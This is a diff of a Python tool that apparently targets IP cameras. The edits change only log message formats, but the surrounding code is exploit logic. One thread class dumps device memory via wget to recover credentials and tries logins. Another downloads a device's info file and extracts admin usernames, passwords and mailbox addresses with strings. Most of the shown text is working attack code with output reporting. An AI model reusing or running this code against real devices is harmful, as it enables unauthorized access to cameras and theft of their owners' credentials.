@@ -120,9 +120,9 @@ class NWThread(threading.Thread):
                     tmp=i.split('\'')
                     macaddr=tmp[1]
                     if args.outputfile:
-                        logger.info(color.A+"[*]"+color.E+" IP:%s,port:%s,MAC:%s"%(self.ip,self.port,macaddr))
+                        logger.info(color.A+"[*]"+color.E+" %s:%s, MAC:%s"%(self.ip,self.port,macaddr))
                     if args.verbose:
-                        print(color.A+"[*]"+color.E+" IP:%s,port:%s,MAC:%s"%(self.ip,self.port,macaddr))
+                        print(color.A+"[*]"+color.E+" %s:%s, MAC:%s"%(self.ip,self.port,macaddr))
                     return macaddr
         except Exception:
             return None
@@ -133,18 +133,18 @@ class NWThread(threading.Thread):
                 pw = subprocess.Popen(pw_args,stdout=open(self.tmpstream,'w'))
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The ip:%s,port:%s,wget part has error occured:%s"%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured:%s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The ip:%s,port:%s,wget part has error occured:%s"%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured:%s"%(self.ip,self.port,e))
             subprocess.Popen("echo '' > %s" % self.tmpout,shell=True)
             time.sleep(1)
             try:
                 pt = subprocess.Popen("tail --pid=%d -f %s | strings >> %s" % (pw.pid,self.tmpstream, self.tmpout), shell=True)
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The ip:%s,port:%s,tail -f part has error occured:%s"%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured:%s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The ip:%s,port:%s,tail -f part has error occured:%s"%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured:%s"%(self.ip,self.port,e))
             subprocess.Popen("sed -e 's/replace/%s/g' -e 's/300/%d/g' %s > %s" % (self.forreplace,args.timeout+100,self.base, self.usefile), shell=True)
             time.sleep(0.5)
             subprocess.Popen("chmod a+x %s" % self.usefile, shell=True)
@@ -153,24 +153,24 @@ class NWThread(threading.Thread):
                 padd = subprocess.Popen([self.usefile])
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The ip:%s,port:%s,addpy part has error occured:%s"%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured:%s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The ip:%s,port:%s,addpy part has error occured:%s"%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured:%s"%(self.ip,self.port,e))
             while True:
                 if os.stat(self.tmpout).st_size < 1024:
                     self.init_end_time = time.time()
                     if self.init_end_time - self.starttime > 60:
                         if args.outputfile:
-                            logger.info(color.C+"[!]"+color.E+" The ip:%s,port:%s is not vulnerable!"%(self.ip,self.port))
-                        print(color.C+"[!]"+color.E+" The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port))
+                            logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!"%(self.ip,self.port))
+                        print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!" % (self.ip, self.port))
                         break
                 else:
                     for line in tailer.follow(open(self.tmpout, 'r')):
                         self.tail_end_time = time.time()
                         if self.tail_end_time - self.starttime > args.timeout:
                             if args.outputfile:
-                                logger.info(color.C+"[!]"+color.E+" The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port))
-                            print(color.C+"[!]"+color.E+" The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port))
+                                logger.info(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!" % (self.ip, self.port))
+                            print(color.C+"[!]"+color.E+" The %s:%s is not vulnerable!" % (self.ip, self.port))
                             break
                         if self.count == 0:
                             if line == mac:
@@ -262,8 +262,8 @@ class NWThread(threading.Thread):
                         time.sleep(tmp_sleep)
                         if tmp_r.status_code == 200:
                             if args.outputfile:
-                                logger.info(color.G+"[+]"+color.E+" The ip:%s,port:%s,username:%s,password:%s"%(self.ip,self.port,i,j))
-                            print(color.G+"[+]"+color.E+" The ip:%s,port:%s,username:%s,password:%s"%(self.ip,self.port,i,j))
+                                logger.info(color.G+"[+]"+color.E+" The %s:%s, username:%s,password:%s"%(self.ip,self.port,i,j))
+                            print(color.G+"[+]"+color.E+" The %s:%s, username:%s,password:%s"%(self.ip,self.port,i,j))
                             return
                         else:
                             continue
@@ -280,8 +280,8 @@ class NWThread(threading.Thread):
                             time.sleep(tmp_sleep)
                             if tmp_r.status_code == 200:
                                 if args.outputfile:
-                                    logger.info(color.Sucgreen+"The ip:%s,port:%s,username:%s,password:%s" % (self.ip, self.port, i, j))
-                                print(color.G+"[+]"+color.E+" The ip:%s,port:%s,username:%s,password:%s" % (self.ip, self.port, i, j))
+                                    logger.info(color.Sucgreen+"The %s:%s, username:%s,password:%s" % (self.ip, self.port, i, j))
+                                print(color.G+"[+]"+color.E+" The %s:%s, username:%s,password:%s" % (self.ip, self.port, i, j))
                                 return
                             else:
                                 continue
@@ -296,9 +296,9 @@ class NWThread(threading.Thread):
             macaddr=self.getMac()
             if macaddr is not None:
                 if args.outputfile:
-                    logger.info(color.A+'[*]'+color.E+' Exploiting ip:%s,port:%s...' % (self.ip, self.port))
+                    logger.info(color.A+'[*]'+color.E+' Exploiting %s:%s...' % (self.ip, self.port))
                 if args.verbose:
-                    print(color.A+'[*]'+color.E+' Exploiting ip:%s,port:%s...' % (self.ip, self.port))
+                    print(color.A+'[*]'+color.E+' Exploiting %s:%s...' % (self.ip, self.port))
                 self.memorydump(macaddr)
                 self.exploit()
                 if args.outputfile:
@@ -307,9 +307,9 @@ class NWThread(threading.Thread):
                     time.sleep(0)
             else:
                 if args.outputfile:
-                    logger.info(color.C+"[!]"+color.E+" The IP Camera ip:%s,port:%s is not vulnerable!" % (self.ip,self.port))
+                    logger.info(color.C+"[!]"+color.E+" The IP Camera %s:%s is not vulnerable!" % (self.ip,self.port))
                     logger.info()
-                print(color.C+"[!]"+color.E+" The IP Camera ip:%s,port:%s is not vulnerable!" % (self.ip,self.port))
+                print(color.C+"[!]"+color.E+" The IP Camera %s:%s is not vulnerable!" % (self.ip,self.port))
                 time.sleep(0)
         except Exception:
             pass
@@ -329,17 +329,17 @@ class GoAThread(threading.Thread):
     def getInfo(self):
         try:
             if args.outputfile:
-                logger.info(color.A+'[*]'+color.E+' Exploiting ip:%s,port:%s...'%(self.ip,self.port))
+                logger.info(color.A+'[*]'+color.E+' Exploiting %s:%s...'%(self.ip,self.port))
             if args.verbose:
-                print(color.A+'[*]'+color.E+' Exploiting ip:%s,port:%s...'%(self.ip,self.port))
+                print(color.A+'[*]'+color.E+' Exploiting %s:%s...'%(self.ip,self.port))
             pw_args = shlex.split("wget -qO - %r" % self.info_url)
             pw = subprocess.Popen(pw_args, stdout=open(self.wget_out_path, 'w'))
             tmp_sleeptime = random.randint(10, 30)
             time.sleep(tmp_sleeptime)
             if os.stat(self.wget_out_path).st_size > 0:
                 if args.outputfile:
-                    logger.info(color.G+"[+]"+color.E+" The ip:%s,port:%s is vulnerable!"%(self.ip,self.port))
-                print(color.G+"[+]"+color.E+" The ip:%s,port:%s is vulnerable!"%(self.ip,self.port))
+                    logger.info(color.G+"[+]"+color.E+" The %s:%s is vulnerable!"%(self.ip,self.port))
+                print(color.G+"[+]"+color.E+" The %s:%s is vulnerable!"%(self.ip,self.port))
                 try:
                     pstr = subprocess.Popen(['strings', ], stdin=open(self.wget_out_path, 'r'),
                                             stdout=open(self.strings_out_path, 'w'))
@@ -350,16 +350,16 @@ class GoAThread(threading.Thread):
                             if 'nc' in i or 'sh' in i:
                                 if not self.ftp_flag:
                                     if args.outputfile:
-                                        logger.info(color.C+"[!]"+color.E+" The ip:%s,port:%s,FTP may be vulnerable!" % (self.ip, self.port))
-                                    print(color.C+"[!]"+color.E+" The ip:%s,port:%s,FTP may be vulnerable!" % (self.ip, self.port))
+                                        logger.info(color.C+"[!]"+color.E+" The %s:%s, FTP may be vulnerable!" % (self.ip, self.port))
+                                    print(color.C+"[!]"+color.E+" The %s:%s, FTP may be vulnerable!" % (self.ip, self.port))
                                     self.ftp_flag=True
                             elif '@' in i:
                                 if not self.mailbox_flag:
                                     tmp_mailbox = i.strip('\n').strip(' ').strip()
                                     if args.outputfile:
-                                        logger.info(color.C+"[!]"+color.E+" The ip:%s,port:%s,mailbox:%s" % (self.ip, self.port, tmp_mailbox))
+                                        logger.info(color.C+"[!]"+color.E+" The %s:%s, mailbox:%s" % (self.ip, self.port, tmp_mailbox))
                                         logger.info(color.C+"[!]"+color.E+" You may check mailbox password manually in directory RECHECK!The file is recheck_%s"%self.ip)
-                                    print(color.C+"[!]"+color.E+" The ip:%s,port:%s,mailbox:%s" % (self.ip, self.port, tmp_mailbox))
+                                    print(color.C+"[!]"+color.E+" The %s:%s, mailbox:%s" % (self.ip, self.port, tmp_mailbox))
                                     print(color.C+"[!]"+color.E+" You may check mailbox password manually in directory RECHECK!The file is recheck_%s"%self.ip)
                                     self.mailbox_flag = True
                                     self.keep_strings_file = True
@@ -367,15 +367,15 @@ class GoAThread(threading.Thread):
                                 if 'admin' in i:
                                     tmp_username = i.strip('\n').strip(' ').strip()
                                     if args.outputfile:
-                                        logger.info(color.G+"[+]"+color.E+" The ip:%s,port:%s,username:%s" % (self.ip, self.port, tmp_username))
-                                    print(color.G+"[+]"+color.E+" The ip:%s,port:%s,username:%s" % (self.ip, self.port, tmp_username))
+                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, username:%s" % (self.ip, self.port, tmp_username))
+                                    print(color.G+"[+]"+color.E+" The %s:%s, username:%s" % (self.ip, self.port, tmp_username))
                                     count = 1
                                     continue
                             elif count == 1:
                                 tmp_password = i.strip('\n').strip(' ').strip()
                                 if args.outputfile:
-                                    logger.info(color.G+"[+]"+color.E+" The ip:%s,port:%s,password:%s" % (self.ip, self.port, tmp_password))
-                                print(color.G+"[+]"+color.E+" The ip:%s,port:%s,password:%s" % (self.ip, self.port, tmp_password))
+                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, password:%s" % (self.ip, self.port, tmp_password))
+                                print(color.G+"[+]"+color.E+" The %s:%s, password:%s" % (self.ip, self.port, tmp_password))
                                 break
                             else:
                                 continue
@@ -399,8 +399,8 @@ class GoAThread(threading.Thread):
                 try:
                     pw.kill()
                     if args.outputfile:
-                        logger.info(color.C+"[!]"+color.E+" The ip:%s,port:%s may not be vulnerable!"%(self.ip,self.port))
-                    print(color.C+"[!]"+color.E+" The ip:%s,port:%s may not be vulnerable!"%(self.ip,self.port))
+                        logger.info(color.C+"[!]"+color.E+" The %s:%s may not be vulnerable!"%(self.ip,self.port))
+                    print(color.C+"[!]"+color.E+" The %s:%s may not be vulnerable!"%(self.ip,self.port))
                 except Exception:
                     pass
         finally:
